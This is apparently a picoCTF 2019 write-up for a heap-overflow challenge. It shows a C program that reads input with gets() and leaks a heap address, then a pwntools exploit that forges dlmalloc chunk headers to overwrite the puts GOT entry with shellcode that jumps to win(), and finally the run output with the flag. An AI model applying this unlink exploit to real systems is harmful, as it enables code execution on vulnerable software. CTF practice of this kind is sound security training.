# Heap overflow
Binary Exploitation, 450 points

## Description:
> Just pwn this using a heap overflow taking advantage of douglas malloc free program and get a flag.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define FLAGSIZE 128

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAGSIZE,f);
  fprintf(stdout,"%s\n",buf);
  fflush(stdout);
}

int main(int argc, char *argv[])
{
   char *fullname, *name, *lastname;
   fullname = malloc(666);
   name = malloc(66);
   lastname = malloc(66);
   printf("Oops! a new developer copy pasted and printed an address as a decimal...\n");
   printf("%d\n",fullname);
   printf("Input fullname\n");
   gets(fullname);
   printf("Input lastname\n");
   gets(lastname);
   free(fullname);
   puts("That is all...\n");
   free(name);
   free(lastname);
   exit(0);
}
```


## Solution:

(Initial commit with just the script)

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

io = start()

io.recvuntil("Oops! a new developer copy pasted and printed an address as a decimal...\n")
address = int(io.recvline())

shell_code = asm('jmp l1; nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop; l1: push {}; ret;'.format(hex(exe.symbols["win"])))
payload = shell_code + ('B' * (664-len(shell_code))) + p32(-4, sign = "signed") + p32(-4, sign = "signed") + p32(exe.got["puts"] - 12) + p32(address)


io.sendlineafter("Input fullname", payload)
io.sendlineafter("Input lastname", "a")

print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/Heap_overflow# python exploit.py
[*] '/media/sf_CTFs/pico/Heap_overflow/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.AMZmXSs4OS'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166'
[+] Starting remote process '/problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166/vuln' on 2019shell1.picoctf.com: pid 1220071
[+] Receiving all data: Done (33B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1220071)

picoCTF{a_s1mpl3_h3ap_5e4b54d4}
```